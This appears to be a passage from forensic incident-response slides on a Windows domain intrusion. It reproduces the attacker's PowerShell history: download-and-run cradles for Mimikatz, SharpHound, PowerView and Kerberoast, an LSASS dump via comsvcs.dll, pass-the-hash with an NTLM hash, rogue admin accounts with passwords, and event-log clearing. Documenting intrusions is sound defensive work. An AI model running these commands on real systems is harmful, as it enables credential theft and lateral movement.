| 2022-02-19T20:45:13Z | 1 | https://webwormhole.io/# | Chrome | pat.risus |
| 2022-02-19T20:45:15Z | 1 | https://webwormhole.io/#jump-hull-rerun | Chrome | pat.risus |
| 2022-02-19T20:52:59Z | 2 | https://www.google.com/search?q=psexec64+download&rlz=1C1GCEA_enUS993US993&oq=psexec64+download&aqs=chrome.0.0i512l2j0i22i30l3.2452j1j7&sourceid=chrome&ie=UTF-8 | Chrome | pat.risus |
| 2022-02-19T20:53:02Z | 1 | https://live.sysinternals.com/ | Chrome | pat.risus |


---

## Slide 4 (RDP01)

* LSASS Memory Dump File Creation
  - 2022-02-19 20:47:03 - C:\Users\PAT~1.RIS\AppData\Local\Temp\ls ass.DMP <br/> C:\Windows\System32\Taskmgr.exe

* LSASS Memory Dump using Comsvcs DLL
  - 2022-02-19 20:48:46 - C:\Windows\System32\rundll32.exe <br/> "C:\windows\system32\rundll32.exe" C:\windows\System32\comsvcs.dll MiniDump 828 C:\dump full


---

## Slide 5 (RDP01)

* NTLM DownGrade:

| Timestamp | EventID | Activity |
| -- | -- | -- |
| 2022-02-19 19:09:54 | 13 | + NetNTLM Downgrade Attack <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000000) <br/> HKLM\System\CurrentControlSet\Control\Ls a\lmcompatibilitylevel |
| 2022-02-19 19:09:54 | 13 | + NetNTLM Downgrade Attack <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000000) <br/> HKLM\System\CurrentControlSet\Control\Ls a\MSV1_0\NtlmMinClientSec |
| 2022-02-19 19:09:54 | 13 | + NetNTLM Downgrade Attack <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKLM\System\CurrentControlSet\Control\Ls a\MSV1_0\RestrictSendingNTLMTraffic |
| 2022-02-19 20:54:55 | 13 | + NetNTLM Downgrade Attack <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000000) <br/> HKLM\System\CurrentControlSet\Control\Ls a\lmcompatibilitylevel |
| 2022-02-19 20:54:55 | 13 | + NetNTLM Downgrade Attack <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000000) <br/> HKLM\System\CurrentControlSet\Control\Ls a\MSV1_0\NtlmMinClientSec |
| 2022-02-19 20:54:55 | 13 | + NetNTLM Downgrade Attack <br/> "rdp01.magnumtempus.financial" <br/> DWORD (0x00000001) <br/> HKLM\System\CurrentControlSet\Control\Ls a\MSV1_0\RestrictSendingNTLMTraffic |


---

## Slide 6 (RDP01)

* Adding Users/Administrators:

| Timestamp | EventID | Activity |
| -- | -- | -- |
| 2022-02-19 21:12:58 | 1 | + Hurricane Panda Activity <br/> "rdp01.magnumtempus.financial" <br/> C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\pat.risus\Deskt op\computers.txt net localgroup administ rators combosecurity /ADD |
| 2022-02-19 21:14:28 | 1 | + Hurricane Panda Activity <br/> "rdp01.magnumtempus.financial" <br/> C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\De sktop\computers.txt net localgroup admin istrators combosecurity /ADD |
| 2022-02-19 21:15:07 | 1 | + Hurricane Panda Activity <br/> "rdp01.magnumtempus.financial" <br/> C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\De sktop\computers.txt net localgroup admin istrators combosecurity /ADD |
| 2022-02-19 21:17:46 | 1 | + Local Accounts Discovery + Whoami Execution <br/> "rdp01.magnumtempus.financial" <br/> C:\Windows\System32\whoami.exe <br/> "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:17:59 | 1 | + Local Accounts Discovery + Whoami Execution <br/> "rdp01.magnumtempus.financial" <br/> C:\Windows\System32\whoami.exe <br/> "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:18:28 | 1 | + Local Accounts Discovery + Whoami Execution <br/> "rdp01.magnumtempus.financial" <br/> C:\Windows\System32\whoami.exe <br/> "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:19:03 | 1 | + Hurricane Panda Activity <br/> "rdp01.magnumtempus.financial" <br/> C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\De sktop\3.txt net localgroup administrator s jimbo /ADD |
| 2022-02-19 21:19:46 | 1 | + Hurricane Panda Activity <br/> "rdp01.magnumtempus.financial" <br/> C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\De sktop\2.txt net localgroup administrator s hass /ADD |
| 2022-02-19 21:21:25 | 1 | + Hurricane Panda Activity <br/> "rdp01.magnumtempus.financial" <br/> C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\De sktop\1.txt net localgroup administrator s andy /ADD |


---

## Slide 7 (RDP01)

* Pat Risus: Powershell History (PSReadLine):

```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3;
[Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3";
iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1') ; invoke-bloodhound -Collectionmethod dconly
clear
mv .\20220219201253_BloodHound.zip .\Desktop\
foreach ($s in [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Sites ){write-host "[>] (site) $s";foreach ($r in $s.Subnets){write-host "    └─> (subnet) $r";foreach ($m in $s.Servers){write-host "       └─> (server) $m"}}}
ipconfig /all
IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); invoke-portscan -hosts 172.16.50.0/24 -ports "445" -AllformatsOut smbScan
ls
cat .\smbScan.gnmap
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat
Start-Process -FilePath "powershell.exe" -Verb RunAsUser
mv C:\Users\pat.risus\Desktop\computers.txt C:\Users\brent.socium\
tasklist /M;rdpcorets.dll
tasklist /M:rdpcorets.dll
C:\windows\system32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 828 C:\dump full
ls C:\
cd C:\Users\brent.socium\
ls
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3
[Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam"
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
ls
pwd
mv .\computers.txt .\Desktop\
cd .\Desktop\
ls
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"'
clear-eventlog -log application,system,security
get-eventlog --list
get-eventlog -list
telnet
```

---

## Slide 8 (Files)

* Suspicious Powershell Commands by user: Administrator.MAGNUMTEMPUS

```
ls
Clear-EventLog -Log Application -Confirm
Clear-EventLog -Log Application
net user localgroup
net user john
net user john
```

---

## Slide 9 (Files)

* Hostile Activity

```
2022-02-19 21:00:40 Net.exe User Account Creation: "net" user combosecurity B4bymeta! /ADD
2022-02-19 21:00:40 Net.exe User Account Creation: C:\Windows\system32\net1 user combosecurity B4bymeta! /ADD
2022-02-19 21:16:11 Net.exe Execution: "net" localgroup administrators combosecurity /ADD
2022-02-19 21:16:11 Net.exe Execution: C:\Windows\system32\net1 localgroup administrators combosecurity /ADD
2022-02-19 21:17:36 Net.exe User Account Creation: "net" user andy B1rdD0g! /ADD
2022-02-19 21:17:36 Net.exe User Account Creation: C:\Windows\system32\net1 user andy B1rdD0g! /ADD
2022-02-19 21:21:46 Net.exe Execution: "net" localgroup administrators andy /ADD
2022-02-19 21:21:46 Net.exe Execution: C:\Windows\system32\net1 localgroup administrators andy /ADD
2022-02-19 21:21:54 Net.exe User Account Creation: "net" localgroup "Remote Desktop Users" andy /ADD
2022-02-19 21:21:54 Net.exe User Account Creation: C:\Windows\system32\net1 localgroup "Remote Desktop Users" andy /ADD
2022-02-19 21:30:46 Non Interactive PowerShell: "powershell.exe" -command "& {Clear-Eventlog -Log Application,System,Security}"
```

---

## Slide 10 (Files)

* NTLM Downgrade Attack

```
2022-02-19 20:21:42 NetNTLM Downgrade Attack: HKLM\System\CurrentControlSet\Control\Lsa\lmcompatibilitylevel
2022-02-19 20:21:42 NetNTLM Downgrade Attack: HKLM\System\CurrentControlSet\Control\Lsa\MSV1_0\NtlmMinClientSec
2022-02-19 20:21:42 NetNTLM Downgrade Attack: HKLM\System\CurrentControlSet\Control\Lsa\MSV1_0\RestrictSendingNTLMTraffic
```




